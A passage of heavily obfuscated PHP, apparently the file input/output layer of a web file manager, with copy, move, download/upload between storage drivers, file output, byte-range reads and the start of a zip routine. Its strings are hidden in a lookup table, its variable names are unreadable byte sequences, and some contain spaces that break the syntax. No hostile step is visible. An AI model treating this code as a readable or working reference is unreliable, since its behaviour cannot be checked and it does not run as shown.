$_SERVER[¯µç›È¢]; $¹şÄ… = $°ö‚ôÌ; $GLOBALS[$êÍôÄö–[1158]] = $êÍôÄö–[1159] . $ºÍ•À˜å; Hook::trigger($êÍôÄö–[1159] . $ºÍ•À˜å . $êÍôÄö–[1160], $¹şÄ…); $µÇèƒÙ = self::driverMake($°ö‚ôÌ[0]); if (!$µÇèƒÙ) { return !1; } if (method_exists($µÇèƒÙ, $ºÍ•À˜å)) { $—ÍË°ÁÖ = @call_user_func_array(array($µÇèƒÙ, $ºÍ•À˜å), $°ö‚ôÌ); } else { if (method_exists($µÇèƒÙ, $êÍôÄö–[1161])) { $—ÍË°ÁÖ = @call_user_func_array(array($µÇèƒÙ, $ºÍ•À˜å), $°ö‚ôÌ); } else { if (method_exists(self, $ºÍ•À˜å)) { $—ÍË°ÁÖ = @call_user_func_array(array(self, $ºÍ•À˜å), $°ö‚ôÌ); } else { $—ÍË°ÁÖ = call_user_func_array(array(parent, $ºÍ•À˜å), $°ö‚ôÌ); } } } Hook::trigger($êÍôÄö–[1159] . $ºÍ•À˜å . $êÍôÄö–[1162], $¹şÄ…, $—ÍË°ÁÖ); return $—ÍË°ÁÖ; } public static function init($‘¸–³Î) { return self::driverMake($‘¸–³Î); } public static function copy($ôŸä§Çı, $€ÜªÈ¢, $íİòüŸÖ = false, $¡¸–ÓœÚ = false) { return self::copyMoveStart($ôŸä§Çı, $€ÜªÈ¢, $íİòüŸÖ, $_SERVER[¯µç›È¢][557], $¡¸–ÓœÚ); } public static function move($ÕçãË, $á‰ó³æÈ, $ÖÛåËÄš = false, $ü¥ú·âÜ = false) { return self::copyMoveStart($ÕçãË, $á‰ó³æÈ, $ÖÛåËÄš, $_SERVER[¯µç›È¢][559], $ü¥ú·âÜ); } private static function copyMoveStart($ú¦½¹öº, $ÕÔÊ«¬ä, $Õ™À­ò«, $ïÓÖ¤Ùƒ, $ƒ™ÄÆõ¬) { $™ú ¢ğ¥ =& $_SERVER[¯µç›È¢]; $ŒÔÉİ¡õ = array($ú¦½¹öº, $ÕÔÊ«¬ä, $Õ™À­ò«, $ƒ™ÄÆõ¬); Hook::trigger($™ú ¢ğ¥[1159] . $ïÓÖ¤Ùƒ . $™ú ¢ğ¥[1160], $ŒÔÉİ¡õ); $ÖËŞ¯İà = self::copyMove($ú¦½¹öº, $ÕÔÊ«¬ä, $Õ™À­ò«, $ïÓÖ¤Ùƒ, $ƒ™ÄÆõ¬); Hook::trigger($™ú ¢ğ¥[1159] . $ïÓÖ¤Ùƒ . $™ú ¢ğ¥[1162], $ŒÔÉİ¡õ, $ÖËŞ¯İà); return $ÖËŞ¯İà; } public static function saveFile($ˆ¦Ëü¢, $É¸‘Œî, $¿ø¿ş– = true) { $¨“˜òùù =& $_SERVER[¯µç›È¢]; $íùÂ¡ş = self::info($É¸‘Œî); $Ö…‹Íş£ = self::driverMake($ˆ¦Ëü¢); $Ì·Í°Ëï = self::driverMake($É¸‘Œî); $¯„‰Â§ı = !1; if ($Ì·Í°Ëï->pathParse[$¨“˜òùù[1163]]) { $¯„‰Â§ı = $Ì·Í°Ëï; $Î£×¢åµ = $Ì·Í°Ëï->pathParse[$¨“˜òùù[1163]]; $Ì·Í°Ëï = self::driverMake($Î£×¢åµ); } if ($Ö…‹Íş£->pathParse[$¨“˜òùù[1163]]) { $ÆÕ°Õ‡ = $Ö…‹Íş£->pathParse[$¨“˜òùù[1163]]; $Ö…‹Íş£ = self::driverMake($ÆÕ°Õ‡); } $Ã¤€Ã„ = $Ì·Í°Ëï->pathFather($É¸‘Œî); $óÀ¡™Îğ = !0; if (!$¿ø¿ş– && self::driverIsSame($Ö…‹Íş£, $Ì·Í°Ëï)) { $óÀ¡™Îğ = !1; } $°ÃÉÚšÛ = self::copyFile($Ö…‹Íş£, $ˆ¦Ëü¢, $Ì·Í°Ëï, $Ã¤€Ã„, $íùÂ¡ş[$¨“˜òùù[32]], $óÀ¡™Îğ); if ($¯„‰Â§ı) { $°ÃÉÚšÛ = $¯„‰Â§ı->getPathOuter($°ÃÉÚšÛ); } return $°ÃÉÚšÛ; } private static function copyMove($—ú¯ıóˆ, $¥ ’ÎÙÇ, $ˆ…¼ÑÖ, $’®âÜ”À, $¯şå—õ = false) { $É¨ï¨øÊ =& $_SERVER[¯µç›È¢]; if (!$—ú¯ıóˆ || $—ú¯ıóˆ == $É¨ï¨øÊ[8] || !$¥ ’ÎÙÇ) { return !1; } ignore_timeout(); $î¸—âİæ = self::driverMake($—ú¯ıóˆ); $Û‰È«—ğ = self::driverMake($¥ ’ÎÙÇ); $¤¶§¨öˆ = $’®âÜ”À == $É¨ï¨øÊ[559]; $óô·«´Ù = !1; if ($Û‰È«—ğ->pathParse[$É¨ï¨øÊ[1163]]) { $óô·«´Ù = $Û‰È«—ğ; $¥ ’ÎÙÇ = $Û‰È«—ğ->pathParse[$É¨ï¨øÊ[1163]]; $Û‰È«—ğ = self::driverMake($¥ ’ÎÙÇ); } if ($î¸—âİæ->pathParse[$É¨ï¨øÊ[1163]]) { $—ú¯ıóˆ = $î¸—âİæ->pathParse[$É¨ï¨øÊ[1163]]; $î¸—âİæ = self::driverMake($—ú¯ıóˆ); } self::check($î¸—âİæ, $—ú¯ıóˆ, $Û‰È«—ğ, $¥ ’ÎÙÇ); Hook::trigger($É¨ï¨øÊ[85], $î¸—âİæ, $—ú¯ıóˆ, $Û‰È«—ğ, $¥ ’ÎÙÇ); $Œõ‚ö·ñ = self::driverIsSame($î¸—âİæ, $Û‰È«—ğ); if ($Œõ‚ö·ñ) { if ($’®âÜ”À == $É¨ï¨øÊ[559] && !method_exists($Û‰È«—ğ, $É¨ï¨øÊ[1164]) && trim($¥ ’ÎÙÇ, $É¨ï¨øÊ[8]) == trim($Û‰È«—ğ->pathFather($—ú¯ıóˆ), $É¨ï¨øÊ[8])) { if ($î¸—âİæ->pathThis($—ú¯ıóˆ) != $¯şå—õ && !$î¸—âİæ->isTypeObject()) { return $î¸—âİæ->rename($—ú¯ıóˆ, $¯şå—õ); } return $Û‰È«—ğ->getPathOuter($—ú¯ıóˆ); } if (method_exists($Û‰È«—ğ, $’®âÜ”À)) { return $Û‰È«—ğ->{$’®âÜ”À}($—ú¯ıóˆ, $¥ ’ÎÙÇ, $ˆ…¼ÑÖ, $¯şå—õ); } } if ($Œõ‚ö·ñ && $’®âÜ”À == $É¨ï¨øÊ[559] && $Û‰È«—ğ->getType() == $É¨ï¨øÊ[117]) { $êÈÏá—· = $Û‰È«—ğ->movePath($—ú¯ıóˆ, $¥ ’ÎÙÇ, $¯şå—õ); if ($êÈÏá—·) { return $êÈÏá—·; } } $‡‹Ï¿À = $î¸—âİæ->isFile($—ú¯ıóˆ); if (!$‡‹Ï¿À && $Û‰È«—ğ->getType() == $É¨ï¨øÊ[775] && $î¸—âİæ->getType() == $É¨ï¨øÊ[117]) { $êÈÏá—· = $Û‰È«—ğ->copyFolderFromIO($î¸—âİæ, $—ú¯ıóˆ, $¥ ’ÎÙÇ, $ˆ…¼ÑÖ, $¤¶§¨öˆ, $¯şå—õ); } else { $êÈÏá—· = self::copyPath($î¸—âİæ, $—ú¯ıóˆ, $Û‰È«—ğ, $¥ ’ÎÙÇ, $ˆ…¼ÑÖ, $¤¶§¨öˆ, $‡‹Ï¿À, $¯şå—õ); } if ($êÈÏá—· && $¤¶§¨öˆ) { $î¸—âİæ->remove($—ú¯ıóˆ); } if ($óô·«´Ù) { $êÈÏá—· = $óô·«´Ù->getPathOuter($êÈÏá—·); } return $êÈÏá—·; } private static function check($ĞÀ‘Ş‰, $ÏâÏã§Ù, $¼Âø»“, &$ÊéñÕÙÆ) { $–úÉƒìº =& $_SERVER[¯µç›È¢]; if (self::driverIsSame($ĞÀ‘Ş‰, $¼Âø»“) && $ĞÀ‘Ş‰->isFolder($ÏâÏã§Ù) && $ĞÀ‘Ş‰->isParentOf($ÏâÏã§Ù, $ÊéñÕÙÆ)) { show_json(LNG($–úÉƒìº[1165]), !1); } if (!$ĞÀ‘Ş‰->exist($ÏâÏã§Ù)) { show_json(LNG($–úÉƒìº[116]), !1); } } private static function copyPath($Ìí·¦ôã, $Ğ›ÉÖÁ®, $·†Œï®ş, $Õ—“ÃñÆ, $¬Ò³­á, $à¾ç•À…, $àî¯ê¬›, $¨¯‘Åİ = false) { $‚á½ü¯º =& $_SERVER[¯µç›È¢]; $±ª·Õº = empty($¨¯‘Åİ) && $¨¯‘Åİ !== $‚á½ü¯º[204] ? $Ìí·¦ôã->pathThis($Ğ›ÉÖÁ®) : $¨¯‘Åİ; if ($¬Ò³­á) { $£üÚÛû« = $·†Œï®ş->fileNameExist($Õ—“ÃñÆ, $±ª·Õº); $±ª·Õº = $·†Œï®ş->fileNameAuto($Õ—“ÃñÆ, $±ª·Õº, $¬Ò³­á, !$àî¯ê¬›); $¬Ò³­á = $£üÚÛû« ? $¬Ò³­á : !1; } if ($àî¯ê¬›) { return self::copyFile($Ìí·¦ôã, $Ğ›ÉÖÁ®, $·†Œï®ş, $Õ—“ÃñÆ, $±ª·Õº, $à¾ç•À…); } if ($¬Ò³­á == REPEAT_RENAME_FOLDER) { $¬Ò³­á = !1; } $Ú›ÁÇ°Ú = rtrim($Õ—“ÃñÆ, $‚á½ü¯º[8]) . $‚á½ü¯º[8] . $±ª·Õº; $†ÓıÖáÁ = $·†Œï®ş->mkdir($·†Œï®ş->getPath($Ú›ÁÇ°Ú)); $Õ—“ÃñÆ = $·†Œï®ş->getPathInner($†ÓıÖáÁ); $Ô©« ËÖ = $Ìí·¦ôã->listPath($Ğ›ÉÖÁ®, !0); $Ô©« ËÖ = is_array($Ô©« ËÖ) ? $Ô©« ËÖ : array($‚á½ü¯º[86] => array(), $‚á½ü¯º[87] => array()); $±´ÓËÎ§ = array_merge($Ô©« ËÖ[$‚á½ü¯º[86]], $Ô©« ËÖ[$‚á½ü¯º[87]]); foreach ($±´ÓËÎ§ as $û÷ÓÈ™¿) { $­Ğ¸ã÷â = $û÷ÓÈ™¿[$‚á½ü¯º[33]] == $‚á½ü¯º[206]; $Ğ›ÉÖÁ® = $Ìí·¦ôã->getPathInner($û÷ÓÈ™¿[$‚á½ü¯º[88]]); $‚ğÓÔÂ‡ = self::copyPath($Ìí·¦ôã, $Ğ›ÉÖÁ®, $·†Œï®ş, $Õ—“ÃñÆ, $¬Ò³­á, $à¾ç•À…, $­Ğ¸ã÷â); if (!$‚ğÓÔÂ‡) { IO::errorTips($‚á½ü¯º[1166] . $Ğ›ÉÖÁ® . $‚á½ü¯º[80] . $Õ—“ÃñÆ); } } self::copyMoveKeepInfo($Ìí·¦ôã, $Ğ›ÉÖÁ®, $†ÓıÖáÁ); return $†ÓıÖáÁ; } private static function copyFile($²ƒúà§¸, $Úù¬š‘­, $¥¿”ĞŠì, $¥ÙŸÆ³Á, $¤åÌ¿ì€, $¡’Ù è) { $½×Ôë£º =& $_SERVER[¯µç›È¢]; $¥ÙŸÆ³Á = $¥¿”ĞŠì->getPath(rtrim($¥ÙŸÆ³Á, $½×Ôë£º[8]) . $½×Ôë£º[8] . $¤åÌ¿ì€); $ñĞê©É‰ = $½×Ôë£º[1167] . time() . rand_string(5); Hook::trigger($½×Ôë£º[1168], $²ƒúà§¸, $Úù¬š‘­, $¥¿”ĞŠì, $¥ÙŸÆ³Á, $¤åÌ¿ì€, $ñĞê©É‰); if (self::driverIsSame($²ƒúà§¸, $¥¿”ĞŠì)) { if ($¡’Ù è) { $è‚‚¢¡á = $¥¿”ĞŠì->moveFile($Úù¬š‘­, $¥ÙŸÆ³Á); } else { $è‚‚¢¡á = $¥¿”ĞŠì->copyFile($Úù¬š‘­, $¥ÙŸÆ³Á); } Hook::trigger($½×Ôë£º[1169], $²ƒúà§¸, $Úù¬š‘­, $¥¿”ĞŠì, $¥ÙŸÆ³Á, $¤åÌ¿ì€, $è‚‚¢¡á); self::copyMoveKeepInfo($²ƒúà§¸, $Úù¬š‘­, $è‚‚¢¡á); return $è‚‚¢¡á; } $‘Ö–ˆğ¥ = TEMP_FILES; if ($GLOBALS[$½×Ôë£º[6]][$½×Ôë£º[100]][$½×Ôë£º[813]]) { $‘Ö–ˆğ¥ = $GLOBALS[$½×Ôë£º[6]][$½×Ôë£º[100]][$½×Ôë£º[813]]; } $Å©„ˆ–Š = $‘Ö–ˆğ¥; mk_dir($Å©„ˆ–Š); $ïøú¡ = $Å©„ˆ–Š . $ñĞê©É‰; $ñ¢¦È—ú = $ïøú¡; $ïøú¡ = $²ƒúà§¸->download($Úù¬š‘­, $ïøú¡); $ïøú¡ = $²ƒúà§¸->iconvApp($ïøú¡); if (substr($ïøú¡, strlen($‘Ö–ˆğ¥)) == $‘Ö–ˆğ¥) { $¡’Ù è = !0; } $è‚‚¢¡á = $¥¿”ĞŠì->upload($¥ÙŸÆ³Á, $ïøú¡, $¡’Ù è); self::remove($ñ¢¦È—ú); Hook::trigger($½×Ôë£º[1169], $²ƒúà§¸, $Úù¬š‘­, $¥¿”ĞŠì, $¥ÙŸÆ³Á, $¤åÌ¿ì€, $è‚‚¢¡á); self::copyMoveKeepInfo($²ƒúà§¸, $Úù¬š‘­, $è‚‚¢¡á); return $è‚‚¢¡á; } private static function copyMoveKeepInfo($ü®‘Š–, $„¨§Ô„, $è¤¦æú) { if (!$è¤¦æú) { return; } $»®Ÿ€ÀÀ = $ü®‘Š–->info($„¨§Ô„); if (!is_array($»®Ÿ€ÀÀ)) { return; } IO::setModifyTime($è¤¦æú, $»®Ÿ€ÀÀ[$_SERVER[¯µç›È¢][96]]); } public static function pathFather($©…ä×°—) { $ï«ªËŞ¹ = IO::init($©…ä×°—); $‚¨ªä£ = $ï«ªËŞ¹->pathFather($ï«ªËŞ¹->path); return $ï«ªËŞ¹->getPathOuter($‚¨ªä£); } public static function fileOut($Ã²¥ç•Î, $²“ëÅâ = false, $µµõ®— = false, $Ó¯ï†  = '') { $•ú×‹¶… = self::driverMake($Ã²¥ç•Î); if ($•ú×‹¶…->isFileOutServer()) { return $•ú×‹¶…->fileOutServer($Ã²¥ç•Î, $²“ëÅâ, $µµõ®—, $Ó¯ï† ); } return $•ú×‹¶…->fileOut($Ã²¥ç•Î, $²“ëÅâ, $µµõ®—, $Ó¯ï† ); } public static function fileOutImage($²‡ŠÇ¶„, $†××ÇìÒ = 250) { $˜š…Ğ¶ = array(250, 600, 1200, 2000, 3000, 5000); for ($¤¡ê”‰º = 0; $¤¡ê”‰º < count($˜š…Ğ¶); $¤¡ê”‰º++) { if ($¤¡ê”‰º == 0 && $†××ÇìÒ <= $˜š…Ğ¶[$¤¡ê”‰º]) { $†××ÇìÒ = $˜š…Ğ¶[$¤¡ê”‰º]; break; } else { if ($†××ÇìÒ > $˜š…Ğ¶[$¤¡ê”‰º - 1] && $†××ÇìÒ <= $˜š…Ğ¶[$¤¡ê”‰º]) { $†××ÇìÒ = $˜š…Ğ¶[$¤¡ê”‰º]; break; } else { if ($¤¡ê”‰º == count($˜š…Ğ¶) - 1 && $†××ÇìÒ > $˜š…Ğ¶[$¤¡ê”‰º]) { $†××ÇìÒ = $˜š…Ğ¶[$¤¡ê”‰º]; break; } } } } $ıÉ¡¿» = self::driverMake($²‡ŠÇ¶„); if ($ıÉ¡¿»->isFileOutServer()) { return $ıÉ¡¿»->fileOutImageServer($²‡ŠÇ¶„, $†××ÇìÒ); } return $ıÉ¡¿»->fileOutImage($²‡ŠÇ¶„, $†××ÇìÒ); } private static function driverIsSame($¯û¬ˆë, $’ÎÄ§) { $öåùß×ğ =& $_SERVER[¯µç›È¢]; $É¯¬Œú’ = $¯û¬ˆë->getType(); $ëÆÉøøé = $’ÎÄ§->getType(); if ($É¯¬Œú’ != $ëÆÉøøé) { return !1; } if ($É¯¬Œú’ == $öåùß×ğ[775]) { return !0; } if ($É¯¬Œú’ == $öåùß×ğ[117]) { return !0; } if ($¯û¬ˆë->pathDriver == $’ÎÄ§->pathDriver) { return !0; } return !1; } public static function copyUpdate($¢Ì³® ’, $å‡½‚Ô) { $Èà¿Ùµ =& $_SERVER[¯µç›È¢]; if (!IO::exist($¢Ì³® ’)) { return !1; } if (!IO::exist($å‡½‚Ô)) { IO::mkdir($å‡½‚Ô); } $“Ñ²£à» = self::_listAll($¢Ì³® ’); $ÙÖ¡çØû = self::_listAll($å‡½‚Ô); $ößãëØš = array(); $ûíç¨¾¹ = array(); foreach ($“Ñ²£à» as $—ˆüµ¬à => $­çĞ¥áÈ) { if (isset($ÙÖ¡çØû[$—ˆüµ¬à])) { if ($­çĞ¥áÈ[$Èà¿Ùµ[89]] == 1) { continue; } if ($ÙÖ¡çØû[$—ˆüµ¬à][$Èà¿Ùµ[90]] == $­çĞ¥áÈ[$Èà¿Ùµ[90]]) { continue; } } if ($­çĞ¥áÈ[$Èà¿Ùµ[89]] == 1) { $ûíç¨¾¹[] = $å‡½‚Ô . $Èà¿Ùµ[8] . $—ˆüµ¬à; continue; } $ôË©ŸğÃ = strstr(trim($—ˆüµ¬à, $Èà¿Ùµ[8]), $Èà¿Ùµ[8]) ? get_path_father($—ˆüµ¬à) : $Èà¿Ùµ[12]; $ößãëØš[] = array($Èà¿Ùµ[1170] => $­çĞ¥áÈ[$Èà¿Ùµ[88]], $Èà¿Ùµ[1171] => rtrim($å‡½‚Ô, $Èà¿Ùµ[8]) . $Èà¿Ùµ[8] . $ôË©ŸğÃ, $Èà¿Ùµ[1172] => $­çĞ¥áÈ); } $øü•âÖÃ = array($Èà¿Ùµ[206] => $ößãëØš, $Èà¿Ùµ[89] => $ûíç¨¾¹); Hook::trigger($Èà¿Ùµ[1173], $¢Ì³® ’, $å‡½‚Ô, $øü•âÖÃ); foreach ($ûíç¨¾¹ as $­çĞ¥áÈ) { IO::mkdir($­çĞ¥áÈ); } foreach ($ößãëØš as $­çĞ¥áÈ) { IO::copy($­çĞ¥áÈ[$Èà¿Ùµ[1170]], $­çĞ¥áÈ[$Èà¿Ùµ[1171]], REPEAT_REPLACE); } } private static function _listAll($‡¬æ°¿å) { $„æ¶ùÛ¬ =& $_SERVER[¯µç›È¢]; $‡¬æ°¿å = KodIO::clear($‡¬æ°¿å); $±Ì­‡“ˆ = IO::listAll($‡¬æ°¿å); foreach ($±Ì­‡“ˆ as &$Öæ„¯¿) { $¨¤¾ëµï = substr($Öæ„¯¿[$„æ¶ùÛ¬[88]], strlen($‡¬æ°¿å)); $Öæ„¯¿[$„æ¶ùÛ¬[1174]] = trim($¨¤¾ëµï, $„æ¶ùÛ¬[8]); } unset($Öæ„¯¿); return array_to_keyvalue($±Ì­‡“ˆ, $„æ¶ùÛ¬[1174]); } public static function fileSubstr($µüç©¬ñ, $Ë˜‘ôº, $ã‚€°ßÑ = false) { $ÔÈÛçÍñ =& $_SERVER[¯µç›È¢]; $²†Ÿ÷ş = self::driverMake($µüç©¬ñ); $õç®„å¿ = $²†Ÿ÷ş->size($µüç©¬ñ); $¶œ—ùÓ× = $Ë˜‘ôº; $ºüçŒë± = $ã‚€°ßÑ; if ($Ë˜‘ôº < 0) { $Ë˜‘ôº = $õç®„å¿ + $Ë˜‘ôº; } if ($ã‚€°ßÑ === !1) { $ã‚€°ßÑ = $õç®„å¿ - $Ë˜‘ôº; } if ($Ë˜‘ôº + $ã‚€°ßÑ > $õç®„å¿) { $ã‚€°ßÑ = $õç®„å¿ - $Ë˜‘ôº; } if (!$õç®„å¿ && $²†Ÿ÷ş->getType() == $ÔÈÛçÍñ[117] && !$²†Ÿ÷ş->exist($µüç©¬ñ)) { $ë†‚‚ö® = get_path_this($µüç©¬ñ); $˜‡çÄ× = parse_url_query($ë†‚‚ö®); if (is_array($˜‡çÄ×) && isset($˜‡çÄ×[$ÔÈÛçÍñ[32]])) { $ë†‚‚ö® = urldecode($˜‡çÄ×[$ÔÈÛçÍñ[32]]); } throw new Exception($ÔÈÛçÍñ[1175] . LNG($ÔÈÛçÍñ[1176]) . $ÔÈÛçÍñ[978] . clear_html($ë†‚‚ö®) . $ÔÈÛçÍñ[12]); } if ($ã‚€°ßÑ <= 0) { return $ÔÈÛçÍñ[12]; } if ($Ë˜‘ôº < 0 || $Ë˜‘ôº >= $õç®„å¿ || $ã‚€°ßÑ > 1024 * 1024 * 10) { throw new Exception("\x66\151\x6c\145\122\x65\141\x64\40\x65\x72\x72\157\162\41\40\163\x74\141\162\164\75{$Ë˜‘ôº}\73\x6c\145\x6e\x67\x74\150\x3d{$ã‚€°ßÑ}\73\40\163\x69\172\x65\x3d{$õç®„å¿}\x3b"); } $à¬Æçç– = $²†Ÿ÷ş->fileSubstr($µüç©¬ñ, $Ë˜‘ôº, $ã‚€°ßÑ); if (!$à¬Æçç– && $ã‚€°ßÑ && isset($GLOBALS[$ÔÈÛçÍñ[1177]])) { throw new Exception($GLOBALS[$ÔÈÛçÍñ[1177]][$ÔÈÛçÍñ[1178]]); } return $à¬Æçç–; } private static function driverMake(&$âéÊ¢¶û) { $ç¡øİ–Ï =& $_SERVER[¯µç›È¢]; $ìÈÀ±“ = KodIO::parse($âéÊ¢¶û); if (!self::$driverListSystem) { $Š×ü“÷ò = Model($ç¡øİ–Ï[784])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($Š×ü“÷ò, $ç¡øİ–Ï[405]); } if ($ìÈÀ±“[$ç¡øİ–Ï[33]] == KodIO::KOD_IO && !self::$driverListSystem[$ìÈÀ±“[$ç¡øİ–Ï[405]]]) { return !1; } $âéÊ¢¶û = $ìÈÀ±“[$ç¡øİ–Ï[1179]]; $»òøòéë = self::driverGet($ìÈÀ±“, $âéÊ¢¶û); return $»òøòéë; } private static function driverGet($˜¶Õş¢, &$¹ã§Ëô) { $óàºàƒ =& $_SERVER[¯µç›È¢]; $¢º›ú´¢ = $˜¶Õş¢[$óàºàƒ[1180]]; $ŸåüÓÂù = $˜¶Õş¢[$óàºàƒ[405]]; switch ($˜¶Õş¢[$óàºàƒ[33]]) { case KodIO::KOD_IO: $ …×ıî = self::$driverListSystem[$ŸåüÓÂù]; break; case KodIO::KOD_SOURCE: $¹ã§Ëô = $ŸåüÓÂù . $¹ã§Ëô; $ …×ıî = array($óàºàƒ[1181] => $óàºàƒ[1182], $óàºàƒ[6] => $˜¶Õş¢); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ÙÏ˜ÚÜ = $GLOBALS[$óàºàƒ[1183]]; self::$driverListUser = array_to_keyvalue($ÙÏ˜ÚÜ, $óàºàƒ[405]); } $ …×ıî = self::$driverListUser[$ŸåüÓÂù]; break; case KodIO::KOD_SHARE_LINK: $ …×ıî = array($óàºàƒ[1181] => $óàºàƒ[1184], $óàºàƒ[6] => $˜¶Õş¢); $¬ ’¦şŸ = Action($óàºàƒ[1185])->sharePathInfo($˜¶Õş¢[$óàºàƒ[88]]); $¹ã§Ëô = $¬ ’¦şŸ[$óàºàƒ[408]]; if (!$¬ ’¦şŸ[$óàºàƒ[408]]) { $‹š½ûşñ = Model($óàºàƒ[603])->getInfo($¬ ’¦şŸ[$óàºàƒ[493]]); $¹ã§Ëô = KodIO::clear($‹š½ûşñ[$óàºàƒ[1186]] . $˜¶Õş¢[$óàºàƒ[1179]]); $˜¶Õş¢[$óàºàƒ[491]] = $‹š½ûşñ; $˜¶Õş¢[$óàºàƒ[1163]] = $¹ã§Ëô; $ …×ıî = array($óàºàƒ[1181] => $óàºàƒ[1187], $óàºàƒ[6] => $˜¶Õş¢); } break; case KodIO::KOD_SHARE_ITEM: $ …×ıî = array($óàºàƒ[1181] => $óàºàƒ[1188], $óàºàƒ[6] => $˜¶Õş¢); $‹š½ûşñ = Model($óàºàƒ[603])->getInfo($˜¶Õş¢[$óàºàƒ[405]]); if ($‹š½ûşñ[$óàºàƒ[408]] == $óàºàƒ[204]) { $¹ã§Ëô = KodIO::clear($‹š½ûşñ[$óàºàƒ[1186]] . $˜¶Õş¢[$óàºàƒ[1179]]); $˜¶Õş¢[$óàºàƒ[491]] = $‹š½ûşñ; $˜¶Õş¢[$óàºàƒ[1163]] = $¹ã§Ëô; $ …×ıî = array($óàºàƒ[1181] => $óàºàƒ[1189], $óàºàƒ[6] => $˜¶Õş¢); } else { if (!$¹ã§Ëô) { $¹ã§Ëô = $‹š½ûşñ[$óàºàƒ[408]]; } } break; default: $¹ã§Ëô = $˜¶Õş¢[$óàºàƒ[88]]; $ …×ıî = array($óàºàƒ[1181] => $óàºàƒ[1190]); break; } $´Ş†¨Öñ = $˜¶Õş¢[$óàºàƒ[88]]; if (!isset(self::$driverCache[$´Ş†¨Öñ])) { $½‰­Ş¹ø = strtolower($ …×ıî[$óàºàƒ[106]]); $ıúØ¯ğ = $GLOBALS[$óàºàƒ[6]][$óàºàƒ[100]][$óàºàƒ[843]]; $¥»î¯Ñ = $óàºàƒ[84] . (isset($ıúØ¯ğ[$½‰­Ş¹ø]) ? $ıúØ¯ğ[$½‰­Ş¹ø] : ucfirst($½‰­Ş¹ø)); if (!class_exists($¥»î¯Ñ)) { show_json("{$¥»î¯Ñ}\40\156\x6f\x74\x20\x65\170\151\163\164\163\x21", !1); } $¹°ÜÒœ› = isset($ …×ıî[$óàºàƒ[6]]) ? $ …×ıî[$óàºàƒ[6]] : !1; self::$driverCache[$´Ş†¨Öñ] = new $¥»î¯Ñ($¹°ÜÒœ›); } $¦ôÀÑÍø = self::$driverCache[$´Ş†¨Öñ]; $¦ôÀÑÍø->pathDriver = $¢º›ú´¢; $¦ôÀÑÍø->pathBase = $óàºàƒ[12]; if (isset($ …×ıî[$óàºàƒ[6]][$óàºàƒ[1191]])) { $¦ôÀÑÍø->pathBase = rtrim($ …×ıî[$óàºàƒ[6]][$óàºàƒ[1191]], $óàºàƒ[8]) . $óàºàƒ[8]; $¹ã§Ëô = $¦ôÀÑÍø->pathBase . ltrim($¹ã§Ëô, $óàºàƒ[8]); } $¹ã§Ëô = $¦ôÀÑÍø->getPath($¹ã§Ëô); if (isset($˜¶Õş¢[$óàºàƒ[1163]])) { $¹ã§Ëô = $˜¶Õş¢[$óàºàƒ[1163]]; } $¦ôÀÑÍø->path = $¹ã§Ëô; return $¦ôÀÑÍø; } public static function errorTips($ƒÊı´± = false) { $àîÉ’ëÒ =& $_SERVER[¯µç›È¢]; static $…Ô”¯“¨ = array(); $êßÚÀ§ = 1000; if ($ƒÊı´± === -1) { return $…Ô”¯“¨ ? $…Ô”¯“¨[count($…Ô”¯“¨) - 1] : $àîÉ’ëÒ[12]; } if ($ƒÊı´± === !1) { return implode($àîÉ’ëÒ[66], $…Ô”¯“¨); } if (count($…Ô”¯“¨) >= $êßÚÀ§) { $…Ô”¯“¨ = array_slice($…Ô”¯“¨, $êßÚÀ§ * 0.5, $êßÚÀ§); } $…Ô”¯“¨[] = $ƒÊı´±; write_log($àîÉ’ëÒ[173] . ACTION . $àîÉ’ëÒ[1192] . $ƒÊı´±, $àîÉ’ëÒ[1193]); } public static function getLastError($¤‰ŞüÌº = '') { $ÒÂÎŸ­ = self::errorTips(-1); return $ÒÂÎŸ­ ? $ÒÂÎŸ­ : $¤‰ŞüÌº; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ş‡¡ğ¤; if (!$ş‡¡ğ¤) { $“ùìÌÎ¾ = IO::init($_SERVER[¯µç›È¢][8]); } return $“ùìÌÎ¾; } private static function iconvSystem($¨±ª•úØ) { return self::local()->iconvSystem($¨±ª•úØ); } private static function iconvApp($Ñ¹Ğ‹´¤) { return self::local()->iconvApp($Ñ¹Ğ‹´¤); } public static function zip($”Åù´ñ¶, $«ÅåµŞ = "\172\151\160", $ùş¥ĞÁ€ = '', $ì¸ô”áö = REPEAT_RENAME) { $”»“À³¼ =& $_SERVER[¯µç›È¢]; $“±£Åö— = self::init($”Åù´ñ¶[0][$”»“À³¼[88]]); $¬Ê’ªÜ„ = self::info($”Åù´ñ¶[0][$”»“À³¼[88]]); $‡ô¡Ã› = !1; if (!$ùş¥ĞÁ€ && $“±£Åö—->getType() == $”»“À³¼[117]) { $ëı‘îë² = self::zipFileList($”Åù´ñ¶); } else { $‡ô¡Ã› = $ùş¥ĞÁ€ ? $ùş¥ĞÁ€ : TEMP_FILES . $”»“À³¼[1194] . time() . rand_string(8) . $”»“À³¼[8]; mk_dir($‡ô¡Ã›); $ëı‘îë² = self::zipFileList($”Åù´ñ¶, $‡ô¡Ã›); } $õ±Äî½ = $¬Ê’ªÜ„[$”»“À³¼[32]]; if (count($ëı‘îë²) > 1) { $óÈáÜÉè = IO::info(IO::pathFather($¬Ê’ªÜ„[$”»“À³¼[88]])); $õ±Äî½ = $óÈáÜÉè[$”»“À³¼[32]]; } $÷°Áªı = $‡ô¡Ã›; if (!$÷°Áªı) { $÷°Áªı = get_path_father($¬Ê’ªÜ„[$”»“À³¼[88]]); if (!$ùş¥ĞÁ€ && $“±£Åö—->getType() == $”»“À³¼[117]) { $÷°Áªı = get_path_father($“±£Åö—->path); } $»½¹£¢ú = IO::info($÷°Áªı); if (!$»½¹£¢ú[$”»“À³¼[209]]) { show_json(LNG($”»“À³¼[1195]), !1); } } $´Ü…É°ò = $÷°Áªı . $õ±Äî½ . $”»“À³¼[10] . $«ÅåµŞ; $´Ü…É°ò = get_filename_auto($´Ü…É°ò, $”»“À³¼[12], $ì¸ô”áö); $£¹¬úŞ = self::iconvSystem($´Ü…É°ò); foreach ($ëı‘îë² as $Ü£¤²³Ù => $÷ÙÊô¥™) { $ëı‘îë²[$Ü£¤²³Ù] = self::iconvSystem($÷ÙÊô¥™); } KodArchive::create($£¹¬úŞ, $ëı‘îë²); if (!IO::exist($´Ü…É°ò)) { if ($‡ô¡Ã›) { del_dir($‡ô¡Ã›); } show_json(LNG($”»“À³¼[1196]), !1); } if ($ùş¥ĞÁ€ || 